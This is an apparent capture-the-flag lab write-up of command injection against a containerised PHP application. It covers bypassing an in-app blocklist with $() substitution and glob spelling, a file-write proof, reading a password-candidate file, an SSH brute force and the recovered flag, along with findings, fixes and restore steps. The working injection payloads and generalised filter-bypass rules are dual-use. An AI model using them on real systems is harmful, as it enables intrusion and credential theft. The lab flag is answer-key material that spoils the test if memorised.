# 218 Internal — writeup

**Class gap this engagement fills.** The corpus had evasion as a *class* (lab 283, filter
prevention vs detection) but no lab had made a worker confront an **actual filter's rule
set**. This is that first evidence. Everything below is read off the artefact, cited
`file:line`, and separated into Findings / Controls that held / Instrumentation defects.

---

## Surface

```
$ nmap -sV -Pn -p- --open 172.17.0.6
Nmap scan report for 172.17.0.6
Host is up (0.000048s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
```

**Stack, from the artefact — not from memory.** PHP 8.3 (`/etc/apache2/mods-enabled/php8.3.load`),
Apache httpd 2.4.58, OpenSSH 9.6p1, fail2ban 1.0.2, `ps aux` PID 1 =
`/bin/sh -c service ssh start && service apache2 start && service fail2ban start && tail -f /dev/null`.

**No `mod_security`.** `ls /etc/apache2/mods-enabled/` has no `security2.load`. The WAF is
therefore *inside the application*, not in the server — which is why the bypass class is
encoding/alternate-syntax and not ModSecurity normalisation.

**What a TCP scan cannot see — measured, not assumed.** `nmap -p-` is TCP by definition, so
UDP was checked separately. Work count: `cat /proc/net/udp` read in full, **0 data rows** (header
only); `docker inspect .Config.ExposedPorts` = `null`. fail2ban listens on a unix socket
(`/var/run/fail2ban/fail2ban.sock`), not a port. **No UDP surface.** Negative carries its work count.

**Virtual hosts — the trípleta applied.** Five names, body hashed, with a name that **cannot
exist** as the control:

| Host | Status | Bytes | sha256 (16) |
|---|---|---|---|
| `internal.dl` | 200 | 19223 | `7bfa2cf9d3a85e94` |
| `backup.internal.dl` | **200** | **22554** | **`259ff62dc8ffb808`** |
| `admin.internal.dl` | 303 | 309 | `d34e1fdcdd263a43` |
| `www.internal.dl` | 303 | 307 | `fad4647ca51f428e` |
| `zzz-nonexistent-tld.dl` | 303 | 314 | `d9240a3b16523c3e` |

The invented TLD shares the **catch-all baseline** (303 → `http://internal.dl/`), which is the
control that proves the 303s are the default vhost and not a control firing. **Two distinct 200s**
= two real applications. The injectable one is `backup.internal.dl` (`/var/www/admin/index.php`,
22554 B); `internal.dl` is a static page (`/var/www/html/index.html`, 19223 B). A flat wordlist
finds `internal.dl`; the sink is one level off the name the landing page advertises.

---

## The class

**Entry criterion (the question that started it):** *What is the filter's rule set, read off the
artefact — and does it name strings or structures?*

**Source that settled it:** `/var/www/admin/index.php:8-45` (`waf_check` + `blacklist_check`),
called at `:58` and `:61`, sink at `:65-66`.

The filter is **two independent PHP string functions over one GET parameter**, not one gateway:

| Layer | Location | Mechanism | Discriminator |
|---|---|---|---|
| `waf_check` | `index.php:8-18` | `strpos()` against `[';', '&&', '||', '`', '\n']` (`:10`) | body `Request blocked. Suspicious operator detected.` (sha `a93f0c50cc63`) |
| `blacklist_check` | `index.php:21-45` | spaces `['+','%20','%09']` (`:23`) then `preg_match('/\b'.preg_quote($cmd,'/').'\b/i')` (`:38`) over 21 command names (`:32-36`) | body `Blacklist: Dangerous command detected in path.` (sha `c2eb23c5660c`) |

**The discriminator between "the WAF blocked me" and "the payload was simply wrong"** is the
response body, and it is decisive precisely because the two layers are byte-distinguishable:

```
$ dir=%2F%3B                          -> 403  {"error":"Request blocked. Suspicious operator detected."}          sha=a93f0c50cc63
$ dir=/tmp`whoami`                   -> 403  {"error":"Request blocked. Suspicious operator detected."}          sha=a93f0c50cc63
$ dir=/tmp\nid                       -> 403  {"error":"Request blocked. Suspicious operator detected."}          sha=a93f0c50cc63
$ dir=/tmp$(whoami)                  -> 403  {"error":"Blacklist: Dangerous command detected in path."}          sha=c2eb23c5660c
```

Three different inputs, one identical WAF body; the fourth, a *different* filter layer, a
different body. **Without this baseline a 403 is unreadable** — it could be either layer, and
"blocked by the WAF" vs "blocked by the blacklist" leads to completely different bypasses.

### The bypass class: alternate syntax + glob expansion — two layers of it

**Layer 1 — `$( )` is an unlisted spelling of a listed syntax.** `waf_check:10` blacklists the
backtick. Parentheses, `$` and `|`(single) are **not** in that array. Evidence that `$( )` is
structurally *not* an operator-filter concern: `dir=/tmp$(whoami)` was stopped by the **blacklist**
(sha `c2eb23c5660c`), not the WAF (sha `a93f0c50cc63`). The operator filter never saw it as an
operator — the command-name filter caught the command *inside* it. **A blocklist names what you
already know; the bypass is the unlisted encoding of the same syntax.**

**Layer 2 — a literal-string blocklist cannot see a glob.** `blacklist_check:38` matches on the
*literal decoded string* with `\b` word boundaries. `i[d]` contains no substring `id`, so
`preg_match('/\bid\b/i')` does not match — and the **shell** then expands `[d]` → `d` and runs
`/usr/bin/id`. The filter validates a string; the shell receives a pattern. **This is the
generalising rule: any `strpos`/`preg_match` blocklist is bypassed by anything the shell
resolves after the check — globs, brace expansion, quoting, `$IFS`, variable indirection.**

Both layers are required: `$()` alone is not enough (`whoami`, `id`, `cat` are all named), and
globs alone are not enough (backtick is named).

### The bypass, executed — proving it reaches the sink

```
$ dir=/tmp$(/usr/bin/i[d])
200 {"success":true,"output":"ok\nls: cannot access '/tmpuid=33(www-data)': No such file or directory\nls: cannot access 'gid=33(www-data)': No such file or directory\nls: cannot access 'groups=33(www-data)': No such file or directory\n"
```

The `id` output appears **as an argument the outer `ls` then failed on** — i.e. the substitution
ran and its stdout was spliced into the command line built at `index.php:65`. That is an
observable effect, not a 200. **Execution identity measured at the sink: `uid=33(www-data)
gid=33(www-data) groups=33(www-data)`** — reported by the sink itself, not assumed.

**Manufactured oracle for the write primitive** (RUNBOOK: a vector with no output needs a
witness). The response only proves *read*. So a uniquely-marked file was written and read back:

```
MARKER = DL218_aad201a29bc1ea93
1. pre-existence : ls -> No such file or directory                  (must be absent)
2. write         : /usr/bin/[i]d > /var/www/html/DL218_aad201a29bc1ea93
3. read back     : base64 -> dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
                   = "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
4. cleanup       : rm -f  -> verified absent again (positive check, not assumed)
```

The witness is distinguishable by design (random token, created by uid 33 into a directory that
did not contain it before), so it cannot be confused with a pre-existing file.

### The negative that justifies the brute force

**Question: can uid 33 read the flag directly?** Five access attempts, stderr captured inside the
substitution and base64-collapsed to one token so it is not re-split by the outer `ls`:

| As `www-data` (uid 33) | Result |
|---|---|
| `ls -la /home/vault/flag.txt` | `Permission denied` |
| `ls -la /home/vault` | `cannot open directory '/home/vault': Permission denied` |
| `ls -la /opt/.vault_pass.txt` | `-rw-r--r-- 1 www-data vault 260 ... /opt/vault_pass.txt` |
| `ls -la /flag.txt` | `No such file or directory` |
| `ls -la /etc/passwd` | `-rw-r--r-- 1 root root 1243 ... /etc/passwd` |

`/home/vault` is `drwxr-x--- vault:vault` and `www-data` is not in group `vault`, so **uid 33
cannot traverse it** → the flag is unreachable from the web primitive. `/opt/.vault_pass.txt` is
mode 644 and **is** readable. **This is why the lab requires SSH, and it is a proven negative,
not an assumption.** Work count: 5 attempts, all with stderr captured and decoded.

*(Instrument note: an earlier version of this test used `[ -r … ]`, which emits **nothing** when
false and nothing when true via `printf` — an oracle-free test. It was discarded and replaced with
the `ls`-based form above, whose "Permission denied" vs "No such file" vs content are
byte-distinguishable. See Instrumentation defects.)*

### The flag file's own hint text — checked, and two claims are wrong

`/home/vault/flag.txt` tells the reader which techniques to use. Measured, not repeated:

| Flag's claim | Measured | Verdict |
|---|---|---|
| "[2] Bypass space blacklist → Used `$IFS` instead of space" | A **literal space passes**: `/tmp$(/usr/bin/i[d])` → `200`, execution reached the sink | **FALSE / unnecessary.** `$blocked_spaces = ['+','%20','%09']` (`index.php:23`) can never match a real space, because PHP has **already URL-decoded** `$_GET['dir']` (`:51`) before the check runs. A real space arrives as `0x20`; the three entries match only if you **double**-encode. The layer is three dead entries. |
| "[1] Bypass operator filter → Used newline instead of `; && ||`" | Literal `\n` → `403` (sha `a93f0c50cc63`); **real `0x0A` → `200`**, execution reached the sink | **TRUE, and a genuine second bypass** — `waf_check:10` lists `'\n'`, a PHP **single**-quoted two-character sequence `\` + `n`, not the `0x0A` byte. Not needed for this chain. |
| "[3] Bypass command blacklist → quotes `c'a't`, base64, or `rev<<<`" | `c'a't` → `200`, returned the container hostname `e4f550b14a47` | **TRUE**, and independent of the glob used here. |
| "Read this file → `/flag.txt`" | `ls -la /flag.txt` as uid 33 → **`No such file or directory`** | **FALSE — the named path does not exist.** The real file is `/home/vault/flag.txt`. |

**Generalisation:** a blocklist entry written as a *literal string that must survive a decode step
upstream of the filter* is not a control. `'+'`, `'%20'`, `'%09'` all name an **encoding**, and the
filter runs *after* the encoding has already been undone. The same reasoning that produced the
`\n` bypass (`'\n'` is not `0x0A`) produced three dead space entries — **the filter author was
filtering a representation, not a value.** This is the single most transferable rule in this lab.

---

## Chain

| # | → | Mechanism | Identity proof |
|---|--|-----------|----------------|
| 1 | `www-data` uid 33 | `index.php:65-66` `shell_exec("ls -lah ".$dir." 2>&1 & echo ok")` reached via `$( )` (unlisted for backtick) + `[d]` glob (blocklist reads literals, shell reads patterns) | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` returned **by the sink** |
| 2 | `www-data` uid 33 | arbitrary write into `/var/www/html` (owned `www-data:www-data`) — marker file created and read back | marker content `uid=33(www-data)…` at `/var/www/html/DL218_aad201a29bc1ea93` |
| 3 | `www-data` uid 33 | read `/opt/.vault_pass.txt` (mode 644) → 260 bytes, 20 candidates | `-rw-r--r-- 1 www-data vault 260` + full 260-byte recovery |
| 4 | `vault` uid 1001 | local brute force over SSH, candidate **17/20** | `id` → `uid=1001(vault) gid=1001(vault) groups=1001(vault),100(users)`; `id -u` → `1001`; `whoami` → `vault` |
| 5 | `vault` uid 1001 | read `/home/vault/flag.txt` — **only** possible because uid 33 could not traverse `/home/vault` | file is `rw-r--r-- vault:vault`; traversal denied above |

**Hop 4 is not a hop the web primitive can make.** Steps 1→3 are capped at uid 33 with no traverse
right on the flag's directory. The identity change at step 4 is what makes step 5 possible; a
report that merged them would imply the injection alone read the flag, and it did not.

---

## Findings

### F1 — OS command injection through a two-layer blocklist WAF (CWE-78)

`/var/www/admin/index.php:65` concatenates `$_GET['dir']` into a shell string and `:66` executes
it. `waf_check` (`:8-18`) and `blacklist_check` (`:21-45`) are string filters over the same input.

- **Evidence:** `dir=/tmp$(/usr/bin/i[d])` → `200`, sink returned `uid=33(www-data)…`.
- **Bypass:** `$( )` for the listed backtick; `[d]` glob for the listed `id`. Both proven above.
- **Impact:** arbitrary command execution as `www-data`.
- **Root cause:** the filter validates a *string representation*; the shell resolves *patterns and
  expansions* after the check. Every entry in both lists is a literal, and each is bypassable by an
  unlisted representation of the same syntax.
- **Fix:** do not build shell strings. Use `escapeshellarg()`/`escapeshellcmd()`, or better, drop
  `shell_exec` for a directory-listing library (`DirectoryIterator`, `scandir`). A denylist of
  command names cannot be made safe; there is no list of dangerous commands, only dangerous input
  handling. **Adding more entries to either array would not have prevented this.**

### F2 — The blocklist's space entries and its newline entry are both representation errors

`index.php:10` lists `'\n'` (backslash + `n`); `:23` lists `'+'`, `'%20'`, `'%09'` — all *encodings*
of a space. The filter runs **after** PHP's `urldecode` on `$_GET['dir']` (`:51`), so:

- a real newline `0x0A` passes the "newline" rule (proven, 200 + execution);
- a real space `0x20` passes the "space" rules (proven, 200 + execution), and no `$IFS` is needed.

**Impact:** four of the filter's rules protect nothing, and one of them advertises a capability
the filter does not have. This is independently reportable from F1 because remediating the blocklist
by extending it — the obvious fix — provably does not work.

### F3 — Arbitrary file write into the primary docroot (CWE-73 / CWE-94 path)

`/var/www/html` is `drwxr-xr-x www-data www-data`, so uid 33 can write it (measured via the sink:
`drwxr-xr-x 1 www-data www-data 4096 ... /var/www/html`). PHP 8.3 is loaded in that vhost
(`php8.3.load`), so a written `.php` file is executable by the web server. Proven to the point of
write only — the marker file was created, read back, and removed; **no webshell was deployed**
(minimal-impact discipline). The persistence follows from the two facts together; it is not claimed
as an executed step.

### F4 — The host guard does not govern the vhost that holds the injection (CWE-441)

`/var/www/html/.htaccess:1-4` is a host allowlist ending in `RewriteRule ^ - [F,L]`. Two defects:

1. **It is in the wrong document root.** `/etc/apache2/sites-enabled/000-default.conf:18` sets the
   backup vhost's `DocumentRoot` to `/var/www/admin/`, and `/var/www/admin/` contains **only**
   `index.php` — no `.htaccess`. Per-directory rules in `/var/www/html/.htaccess` are consulted for
   filenames under `/var/www/html` only. **Proof the guard does not cover the sensitive vhost:**
   `Host: backup.internal.dl.` → `200`, and `ls -a /var/www/admin/` → `index.php` alone.
2. **`:3` reads `%{HTTP_HST}`, not `%{HTTP_HOST}`.** An undefined variable, so the condition that
   was meant to name the backup host is evaluated against the empty string and is vacuously true.

The guard **does** fire where it applies — `Host: internal.dl.` → `403` — so this is not a dead
file; it is a control scoped to the wrong host. Characterised table (all measured):

| Host | Status | Why |
|---|---|---|
| `internal.dl` | 200 | guard cond `:2` false — host matches exactly |
| `INTERNAL.DL` | 200 | `[NC]` |
| `internal.dl.` / `INTERNAL.DL.` | **403** | lands in the `internal.dl` vhost (trailing dot normalised), so cond `:2` is true, cond `:3` vacuously true → `F`. Proves the guard's detector is live. |
| `backup.internal.dl` / `backup.internal.dl.` | **200** | different DocumentRoot, **no `.htaccess`** → guard never consulted |
| `internalx.dl`, `notinternal.dl.`, `foo.dl.`, `a.internal.dl.`, `admin.internal.dl`, `evil.example.com` | 303 | `_default_:80` (`000-default.conf:2`) server-level `Redirect 303` resolves first; `alias.load` is at mods-enabled position 3 and `rewrite.load` at 28 |
| `internal.dl..` | 400 | malformed Host, rejected upstream of both |

*Flagged as inference:* the ordering claim (mod_alias's fixup preceding mod_rewrite's per-directory
fixup inside `_default_`) is the best explanation consistent with the table; the load-order
positions are measured, the hook order is inferred from behaviour. The vhost-scope claim in (1) and
the guard-is-live claim are directly measured.

### F5 — fail2ban is enabled, running, self-reporting "in operation", and detecting nothing

`/etc/fail2ban/jail.local:1-6` — `enabled = true`, `maxretry = 3`, `findtime = 60`, `bantime = 30`.
fail2ban 1.0.2 started and logged `[sshd] Jail is in operation now (process new journal entries)`.

**Measured result: 16 consecutive wrong SSH passwords in ~47 s produced zero bans.**
`fail2ban-client status sshd` after all 16 → `Currently failed: 0`, **`Total failed: 0`**,
`Currently banned: 0`, `Total banned: 0`.

**Root cause, measured:**

- PID 1 is `/bin/sh -c service ssh start && …`, **not systemd**; `/run/systemd/system` does not exist.
- The jail's backend is systemd: the log reads `[sshd] Jail uses systemd {}` and
  `Added journal match for: '_SYSTEMD_UNIT=sshd.service + _COMM=sshd'`.
- There is no journal to match: `/run/log/journal` absent; `/var/log/journal` **empty**.
- No syslog daemon is running; `/var/log/auth.log` **does not exist**. sshd was started by the
  SysV script, not systemd, so its `Failed password` lines reach no file the filter reads.

**Impact:** the configured rate budget (`3 / 60 s`) is **fictional**. The anti-bruteforce control
is decorative. A worker who read `jail.local`, believed the budget, and paced the attack at
2 attempts / 60 s would spend ~10 minutes on a lab that needs zero throttling — and would report a
"rate-limited" brute force that was never rate-limited. **`fail2ban-client status` reporting a
running jail is not evidence the jail works**; the number that matters is `Total failed`, and
against a nonzero number of real failures it read zero.

### F6 — Credential file readable by the compromised identity

`/opt/.vault_pass.txt` is `-rw-r--r-- www-data vault` (mode 644) and holds 260 bytes of SSH
password candidates for user `vault`. It sits next to the application as a "vault password" file
and is world-readable, so the single command-injection primitive yields a full credential list.
Compounding: `www-data` is in **group `vault`** (`ps`: `www-data` workers), so a group-readable
file here is group-readable by the web identity by design.

---

## Controls that held

| Control | Positive control that proves this detector works |
|---|---|
| `waf_check` operator filter (`index.php:8-18`) | **Fired 3/3** on `;`, backtick, literal `\n` — identical body sha `a93f0c50cc63`. It also **fired correctly on my failed attempts** (`&&`, `;` in a compound command) after the bypass was found — the filter never stopped working, my payload changed. |
| `blacklist_check` command filter (`:32-42`) | **Fired on all 21 named commands** across the run: `whoami` (403, sha `c2eb23c5660c`), and later `ls`/`cat`/`id` whenever I spelled them literally — every one blocked with the blacklist body, never the WAF body. |
| Catch-all default vhost (`000-default.conf:1-3`) | The **invented TLD** `zzz-nonexistent-tld.dl` returned the same 303 baseline as every other unmatched name — so "303" is the default, not a control firing. This is the control that made the two 200s readable. |
| `.htaccess` host guard (`/var/www/html/.htaccess:1-4`) | **Detector proven live**: `Host: internal.dl.` → `403 Forbidden` (Apache-generated body, not a JSON filter body). It fires; it is simply scoped to the wrong document root (F4). |
| `/home/vault` directory permissions (`drwxr-x--- vault:vault`) | **Held.** Denied uid 33 twice, via two independent probes (direct file `ls` and directory `ls`), both with stderr captured and decoded. This control is what makes the SSH hop mandatory rather than optional. |
| Apache vhost separation | `backup.internal.dl` and `internal.dl` served **byte-distinct** 200s (22554 vs 19223, distinct sha) — the sensitive app is not the landing page, and the landing page gave no hint of its existence. |

---

## NOT tested vs discarded with reason

**NOT tested (no time / no reason to claim):**

- Any privilege escalation from `vault` (uid 1001) to `root`. Not reached, not attempted, no
  conclusion. The `/opt/vaultlibs/libbackup.so` file (mode `root:vault`, 1787 B) was observed in
  `find /opt -maxdepth 3` and **left unread** — it is the obvious next rung and is explicitly
  untested, not cleared.
- Whether `/var/www/admin/` is writable by any principal other than root (`root:root 755` observed).
- Any `sudoers`, capability or SUID surface. **Note:** the RUNBOOK's `find -writable` defect
  (defect 1) applies to any such sweep; it was not run at all here, so nothing is claimed either way.
- Whether the two 21-word filter layers have an ordering weakness if `waf_check` were moved after
  `blacklist_check`. The current order (`:58` before `:61`) was measured; the alternative was not built.
- UDP services beyond confirming `/proc/net/udp` has 0 rows.

**Discarded with reason:**

| Discarded | Reason |
|---|---|
| `dir=/tmp$(whoami)` as the bypass | 403, sha `c2eb23c5660c` — the **blacklist**, not the WAF. This is what proved `$( )` is unlisted by the operator filter, so it became evidence rather than a dead end. |
| `dir=$([ 1 ] && /usr/bin/[c]at /opt/.vault_pass.txt)` | 403 sha `a93f0c50cc63` — `&&` is a listed operator. Replaced by single-command substitution. |
| `dir=$(:;)` | 403 — `;` listed. |
| Compound commands joined by `;` / `&&` | Both listed at `index.php:10`. Replaced with a **real `0x0A` newline**, which the filter does not match (proven, 200 + execution). |
| `ls -la <file>` read directly in the response | Output is word-split by the outer `ls` at `:65` and misread as directory listings — it produced a **false positive** (a listing that looked like `/home/vault` was actually the cwd, `/var/www/admin`). Replaced with `| base64 -w0` to collapse to one token. |
| `[ -r <path> ]` predicates as access tests | **No oracle** — emits nothing on false and nothing via `printf`. Replaced with `ls`-based probes whose denial message is byte-distinguishable. |
| `$IFS`, quotes `c'a't`, `rev<<<`, base64 for command names | Valid and proven (`c'a't` → 200, returned hostname). Not the bypass used; recorded as **independent confirmation that the bypass class generalises**, so the finding is not over-fitted to one trick. |
| Reading `/flag.txt` as the flag path | `No such file or directory` as uid 33. The flag text names this path; it does not exist. Real path is `/home/vault/flag.txt`. |

---

## Instrumentation defects

**1. `[ -r … ]` has no oracle — the defect that manufactured a false "permission denied".**
My first access test was `$(printf %s $( [ -r /home/vault/flag.txt ] ))`. When the test is false
`[` exits 1 silently; when true it prints nothing. Both cases yield an **empty** substitution, and
an empty substitution makes the outer `ls -lah ` list **its own cwd**. The response therefore
looked like a successful directory listing of `/home/vault` — while actually proving the opposite.
I nearly recorded "www-data can list /home/vault". **The discriminator:** a silent test and a
false test are the same bytes. Replaced with `ls -la … 2>&1 | base64 -w0`, where `Permission
denied` / `No such file` / content are three distinct outputs. **Every negative here now carries
its attempt count and a byte-distinguishable outcome.**

**2. Output of an inner command is re-split by the outer command — a positive that reads as a
negative.** Because `index.php:65` builds `ls -lah <dir>`, **any** spaces in my payload's output
re-enter `ls` as separate arguments. Consequences observed: `ls: invalid line width: '-r--r--'`,
and `ls: cannot access 'uid=33(www-data)'`. `tr -d [:space:]` did not fix it (the outer `ls`
re-quoted the token), and even base64 needed **two** decode passes because the outer `ls` wrapped
the token in quotes. **Cost: ~6 wasted probes.** The fix is to always collapse payload output to a
single space-free token before it re-enters the sink.

**3. `403` is not a verdict, and this lab has two different 403s.** Three WAF blocks shared one
body hash and the blacklist a second. Without that baseline, "the WAF blocked me" and "the
blacklist blocked me" are indistinguishable, and they point at different bypasses. This is the
corpus's existing `403`/`429` row in `method/retrieval-hazards.md` made concrete: the numbers that
are expected working conditions are not verdicts, and here the *body* is the discriminator.

**4. `fail2ban-client status` reporting a running jail was a false positive — the same shape as
defect 1.** `Jail is in operation now` plus `Currently banned: 0` reads as "no bans, therefore
control working, therefore I may attack at full rate". It is the opposite: the jail had **never
observed an event**, because its log backend does not exist in the container. **The negative that
lied was a status field, not an absence.** The control that caught it was feeding it 16 real
failures and watching `Total failed` stay at 0. `Total failed` is the field with meaning; a running
jail is not.

**5. The reward was verified by search, not assumption.** Work count: `grep -rl "FLAG{"` over
`/home /opt /var/www /root /srv /mnt /usr/local /etc` — **564 files scanned, 1 hit**
(`/home/vault/flag.txt`). A second search through the injection against `/var/www` returned no
additional marker.

**6. Redirect-following discipline (corpus defect 2), applied preemptively.** Every probe used
`curl --resolve` with the host in the URL and **no** `-H`, so no `-H`-dropping path was involved
(corpus defect 4) and the `303 → internal.dl` redirects were never silently followed to a `200`
login page. Vhost rows were hashed from the **raw** response, so a followed redirect would have
changed the byte counts and hashes — and did not, except where a `303` was the finding.

**7. `id` measured as the identity, not as root.** The sink's identity came from the sink's own
`id` output (`uid=33(www-data)`), and the SSH identity was confirmed three ways (`id`, `id -u`
→ `1001`, `whoami` → `vault`) rather than inferred from a successful login.

---

## Reward

**Present, literal.** `/home/vault/flag.txt`, reachable only as `vault` (uid 1001):

```
FLAG{CMD_1NJ3CT10N_M4ST3R_W4F_BYP4SS3D}
```

**Absence of any further reward, with the search that established it:** `grep -rl "FLAG{"` across
`/home /opt /var/www /root /srv /mnt /usr/local /etc` — 564 files scanned, **1** hit. No second
flag, no platform-side token, no alternate reward file. The file's own "read this file →
`/flag.txt`" instruction was **checked and is wrong**: `/flag.txt` returns `No such file or
directory`; the real path is `/home/vault/flag.txt`.

---

## Restore

```
$ docker rm -f internal_container
$ docker run -d --name internal_container internal:latest
```

**Verified positively, not by absence:**

| Check | Result |
|---|---|
| Container recreated from the image | new id `1326303467b0…` (pre-restore was `e4f550b14a47…`), `running` |
| Service answering again | `dir=/tmp` → `200`, `ls` output from `/tmp` |
| **Filter restored, not just absent** | `dir=/;` → `403` `{"error":"Request blocked. Suspicious operator detected."}` |
| Marker artefact gone | `ls -a /var/www/html` → `.htaccess`, `index.html` only |
| Brute-force counters reset | `fail2ban-client status sshd` → `Currently failed: 0`, `Total failed: 0` |

Recreated from the image rather than by undoing edits. **No artefacts left in the container**: the
one file I created (`/var/www/html/DL218_aad201a29bc1ea93`) was removed and its absence positively
verified before the restore, and the docroot listing after restore shows only shipped files.
Local scratch (`/tmp/opencode/`) holds the harness and the recovered wordlist only.

---

## Next step

The class row in [`../INDEX.md`](../INDEX.md) points at lab 283 (`Evasión de filtro ·
previene vs detecta`). This lab **extends** it rather than duplicating it. The addition the parent
should carry:

> **A blocklist names what you already know; the bypass is always an unlisted encoding, and the
> rule generalises from there.** Read the filter as a *value*, then ask what the **shell** (or
> parser, or browser) resolves **after** the check. Four rules here died on representation alone:
> `'\n'` is not `0x0A`, and `'+'`/`'%20'`/`'%09'` are encodings of a value that no longer exists
> by the time the filter runs. Discriminate block from wrong-payload by **body hash** — two layers
> of one WAF produced two byte-distinguishable 403s.
